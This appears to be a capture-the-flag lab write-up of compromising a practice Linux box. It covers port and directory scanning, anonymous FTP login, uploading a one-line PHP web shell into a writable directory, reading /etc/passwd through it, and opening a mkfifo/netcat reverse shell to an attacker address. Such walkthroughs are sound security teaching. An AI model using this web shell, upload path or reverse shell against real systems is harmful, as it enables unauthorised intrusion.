# 10.64.144.72

nmap -Pn -sS -sV -sC --open -O -oN nmap.txt 10.64.144.72 -T4

# ftp-anon: Anonymous FTP login allowed (FTP code 230)

──(root㉿docker-desktop)-[/vpn]
└─# nmap -Pn -sS -sV -sC --open -O -oN nmap.txt 10.64.144.72 -T4
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-22 04:15 UTC
Stats: 0:00:18 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 95.83% done; ETC: 04:15 (0:00:00 remaining)
Nmap scan report for 10.64.144.72
Host is up (0.20s latency).
Not shown: 997 closed tcp ports (reset)
PORT STATE SERVICE VERSION
21/tcp open ftp vsftpd 3.0.3
| ftp-syst:
| STAT:
| FTP server status:
| Connected to 192.168.128.109
| Logged in as ftp
| TYPE: ASCII
| No session bandwidth limit
| Session timeout in seconds is 300
| Control connection is plain text
| Data connections will be plain text
| At session startup, client count was 2
| vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230) -> 익명 로그인 허용
| drwxrwxrwx 2 65534 65534 4096 Nov 12 2020 ftp [NSE: writeable]
| -rw-r--r-- 1 0 0 251631 Nov 12 2020 important.jpg
|_-rw-r--r-- 1 0 0 208 Nov 12 2020 notice.txt
22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
| 256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
|\_ 256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
80/tcp open http Apache httpd 2.4.18 ((Ubuntu))
|\_http-server-header: Apache/2.4.18 (Ubuntu)
|\_http-title: Maintenance
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.4
OS details: Linux 4.4
Network Distance: 3 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.57 seconds

# 22, 21, 80

┌──(root㉿docker-desktop)-[/vpn]
└─# http 10.64.144.72:80
HTTP/1.1 200 OK
Accept-Ranges: bytes
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 492
Content-Type: text/html
Date: Sat, 22 Nov 2025 04:16:43 GMT
ETag: "328-5b3e1b06be884-gzip"
Keep-Alive: timeout=5, max=100
Last-Modified: Thu, 12 Nov 2020 04:53:12 GMT
Server: Apache/2.4.18 (Ubuntu)
Vary: Accept-Encoding

<!doctype html>
<title>Maintenance</title>
<style>
  body { text-align: center; padding: 150px; }
  h1 { font-size: 50px; }
  body { font: 20px Helvetica, sans-serif; color: #333; }
  article { display: block; text-align: left; width: 650px; margin: 0 auto; }
  a { color: #dc8100; text-decoration: none; }
  a:hover { color: #333; text-decoration: none; }
</style>

<article>
    <h1>No spice here!</h1>
    <div>
        <!--when are we gonna update this??-->
        <p>Please excuse us as we develop our site. We want to make it the most stylish and convienient way to buy peppers. Plus, we need a web developer. BTW if you're a web developer, <a href="mailto:#">contact us.</a> Otherwise, don't you worry. We'll be online shortly!</p>
        <p>&mdash; Dev Team</p>
    </div>
</article>

# directory path scan -> files

──(root㉿docker-desktop)-[/]
└─# ffuf -u http://10.64.144.72/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev

---

:: Method : GET
:: URL : http://10.64.144.72/FUZZ
:: Wordlist : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt
:: Follow redirects : false
:: Calibration : false
:: Timeout : 10
:: Threads : 40
:: Matcher : Response status: 200-299,301,302,307,401,403,405,500

---

files [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 202ms]
server-status [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 199ms]
:: Progress: [29999/29999] :: Job [1/1] :: 195 req/sec :: Duration: [0:02:39] :: Errors: 1 ::

# common scan -> X

cd /usr/share/wordlists/seclists/Discovery/Web-Content
─(root㉿docker-desktop)-[/usr/share/wordlists/seclists/Discovery/Web-Content]
└─# ffuf -u http://10.64.144.72/FUZZ.php -w common.txt -fs 277

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev

---

:: Method : GET
:: URL : http://10.64.144.72/FUZZ.php
:: Wordlist : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
:: Follow redirects : false
:: Calibration : false
:: Timeout : 10
:: Threads : 40
:: Matcher : Response status: 200-299,301,302,307,401,403,405,500
:: Filter : Response size: 277

---

# files, index.html

:: Progress: [4746/4746] :: Job [1/1] :: 202 req/sec :: Duration: [0:00:25] :: Errors: 0 ::

┌──(root㉿docker-desktop)-[/usr/share/wordlists/seclists/Discovery/Web-Content]
└─# ffuf -u http://10.64.144.72/FUZZ -w common.txt -fs 277

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev

---

:: Method : GET
:: URL : http://10.64.144.72/FUZZ
:: Wordlist : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
:: Follow redirects : false
:: Calibration : false
:: Timeout : 10
:: Threads : 40
:: Matcher : Response status: 200-299,301,302,307,401,403,405,500
:: Filter : Response size: 277

---

files [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 202ms]
index.html [Status: 200, Size: 808, Words: 136, Lines: 21, Duration: 202ms]
:: Progress: [4746/4746] :: Job [1/1] :: 195 req/sec :: Duration: [0:00:27] :: Errors: 0 ::

# subdomain

ffuf -u http://10.64.144.72:80 -H "Host: FUZZ.10.64.144.72:80" -o subdomain.ffuf.txt -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

ffuf -u http://10.64.144.72:80 -H "Host: FUZZ.10.64.144.72:80" -o subdomain.ffuf.txt -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-11000.txt


# http://10.64.144.72/files/notice.txt

Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.

![](https://velog.velcdn.com/images/agnusdei1207/post/59c5cfee-f7d9-4b93-9baf-343f08b0cd66/image.png)


# ftp-anon: Anonymous FTP login allowed (FTP code 230)

┌──(kali㉿kali)-[~]
└─$ sudo ftp 10.64.144.72
Connected to 10.64.144.72.
220 (vsFTPd 3.0.3)
Name (10.64.144.72:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||17429|)
150 Here comes the directory listing.
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
226 Directory send OK.
ftp> ls -al
229 Entering Extended Passive Mode (|||63395|)
150 Here comes the directory listing.
drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 .
drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 ..
-rw-r--r--    1 0        0               5 Nov 12  2020 .test.log
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
226 Directory send OK.
ftp> 


![](https://velog.velcdn.com/images/agnusdei1207/post/ddfc1ee9-267b-4343-bf30-cec70c5473c5/image.png)


# download image -> strings important.jpg -> X

![](https://velog.velcdn.com/images/agnusdei1207/post/beba5151-64f9-4e5b-952d-0493f4f1a460/image.png)


# webshell make

┌──(kali㉿kali)-[~]
└─$ echo '<?php system($_GET["cmd"]); ?>' > web.php

# upload -> fail -> permission X

┌──(kali㉿kali)-[~]
└─$ ftp 10.64.144.72
Connected to 10.64.144.72.
220 (vsFTPd 3.0.3)
Name (10.64.144.72:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||17237|)
150 Here comes the directory listing.
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
226 Directory send OK.
ftp> put web.php
local: web.php remote: web.php
229 Entering Extended Passive Mode (|||19534|)
553 Could not create file.
ftp> cd ftp
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||42877|)
150 Here comes the directory listing.
226 Directory send OK.
ftp> ls -al
229 Entering Extended Passive Mode (|||60883|)
150 Here comes the directory listing.
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 .
drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 ..
226 Directory send OK.


# move to writable path -> upload success

ftp> put web.php
local: web.php remote: web.php
229 Entering Extended Passive Mode (|||50919|)
150 Ok to send data.
100% |*********************************************************************************|    31      172.00 KiB/s    00:00 ETA
226 Transfer complete.
31 bytes sent in 00:00 (0.07 KiB/s)
ftp> 


![](https://velog.velcdn.com/images/agnusdei1207/post/88cc1aa2-3c03-49d7-af8a-d30a6b779c3d/image.png)

# http://10.64.144.72/files/ftp/web.php?cmd=cat%20/etc/passwd

![](https://velog.velcdn.com/images/agnusdei1207/post/8429d832-b96c-4c33-b079-95577a9c3e73/image.png)


root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false syslog:x:104:108::/home/syslog:/bin/false _apt:x:105:65534::/nonexistent:/bin/false lxd:x:106:65534::/var/lib/lxd/:/bin/false messagebus:x:107:111::/var/run/dbus:/bin/false uuidd:x:108:112::/run/uuidd:/bin/false dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin pollinate:x:111:1::/var/cache/pollinate:/bin/false vagrant:x:1000:1000:,,,:/home/vagrant:/bin/bash ftp:x:112:118:ftp daemon,,,:/srv/ftp:/bin/false lennie:x:1002:1002::/home/lennie: ftpsecure:x:1003:1003::/home/ftpsecure:

# rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.130.36 1234 >/tmp/f


pwd 

/var/www/html/files/ftp

whoami

www-data

ls -al /

total 100 
drwxr-xr-x 25 root root 4096 Nov 23 00:40 . 
drwxr-xr-x 25 root root 4096 Nov 23 00:40 .. 
drwxr-xr-x 2 root root 4096 Sep 25 2020 bin 
drwxr-xr-x 3 root root 4096 Sep 25 2020 boot 
drwxr-xr-x 16 root root 3560 Nov 23 00:40 dev 
drwxr-xr-x 96 root root 4096 Nov 12 2020 etc 
drwxr-xr-x 3 root root 4096 Nov 12 2020 home 
drwxr-xr-x 2 www-data www-data 4096 Nov 12 2020 incidents 
lrwxrwxrwx 1 root root 33 Sep 25 2020 initrd.img -> boot/initrd.img-4.4.0-190-generic lrwxrwxrwx 1 root root 33 Sep 25 2020 initrd.img.old -> boot/initrd.img-4.4.0-190-generic drwxr-xr-x 22 root root 4096 Sep 25 2020 lib 
drwxr-xr-x 2 root root 4096 Sep 25 2020 lib64 
drwx------ 2 root root 16384 Sep 25 2020 lost+found 
drwxr-xr-x 2 root root 4096 Sep 25 2020 media 
drwxr-xr-x 2 root root 4096 Sep 25 2020 mnt 
drwxr-xr-x 2 root root 4096 Sep 25 2020 opt 
dr-xr-xr-x 116 root root 0 Nov 23 00:40 proc 
-rw-r--r-- 1 www-data www-data 136 Nov 12 2020 recipe.txt 
drwx------ 4 root root 4096 Nov 12 2020 root 
drwxr-xr-x 25 root root 900 Nov 23 01:30 run 
drwxr-xr-x 2 root root 4096 Sep 25 2020 sbin 
drwxr-xr-x 2 root root 4096 Nov 12 2020 snap 
drwxr-xr-x 3 root root 4096 Nov 12 2020 srv 
dr-xr-xr-x 13 root root 0 Nov 23 00:40 sys 
drwxrwxrwt 7 root root 4096 Nov 23 03:02 tmp d
rwxr-xr-x 10 root root 4096 Sep 25 2020 usr 
drwxr-xr-x 2 root root 4096 Nov 12 2020 vagrant 
drwxr-xr-x 14 root root 4096 Nov 12 2020 var 
lrwxrwxrwx 1 root root 30 Sep 25 2020 vmlinuz -> boot/vmlinuz-4.4.0-190-generic 
lrwxrwxrwx 1 root root 30 Sep 25 2020 vmlinuz.old -> boot/vmlinuz-4.4.0-190-generic

